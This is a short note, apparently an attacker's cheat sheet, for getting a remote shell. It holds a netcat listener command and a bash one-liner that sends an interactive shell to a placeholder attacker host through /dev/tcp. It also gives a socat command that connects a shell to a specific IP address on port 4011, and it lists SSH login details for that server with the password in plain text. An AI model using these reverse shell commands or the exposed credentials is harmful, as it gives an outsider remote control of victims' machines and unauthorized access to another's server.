**Attaсker:**
nc -lvnp 4444

**Victim:**
_bash -c 'exec bash -i &>/dev/tcp/{{attacker-ip}}/{{attacker-port}} <&1'

4011-4015

VDS ip [45.8.144.248](http://45.8.144.248 "http://45.8.144.248")  
ssh rootme@45.8.144.248

  
L:rootme  
P:zse4XDR%
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:45.8.144.248:4011

